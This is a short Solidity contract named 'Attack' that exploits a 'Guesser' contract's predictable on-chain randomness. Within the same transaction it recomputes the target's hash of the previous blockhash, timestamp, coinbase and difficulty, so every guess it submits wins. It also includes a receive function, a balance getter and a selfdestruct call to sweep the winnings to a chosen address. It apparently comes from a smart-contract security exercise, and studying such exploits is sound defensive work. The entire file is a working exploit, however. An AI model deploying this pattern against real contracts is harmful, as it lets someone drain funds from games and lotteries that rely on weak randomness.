// SPDX-License-Identifier: MIT
pragma solidity >=0.7.0 <0.9.0;
import "./Guesser.sol";

contract Attack {
    function attack(Guesser guesser) public payable{
        uint256 rand = uint256(
            keccak256(
                abi.encodePacked(
                    blockhash(block.number - 1),
                    block.timestamp,
                    block.coinbase,
                    block.difficulty,
                    block.coinbase
                )
            )
        );
        if (rand % 2 == 0) {
            guesser.guess{value: msg.value}(0);
        } else guesser.guess{value: msg.value}(1);
    }

    receive() external payable {}

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function destroy(address payable addr) public payable {
        selfdestruct(addr);
    }
}
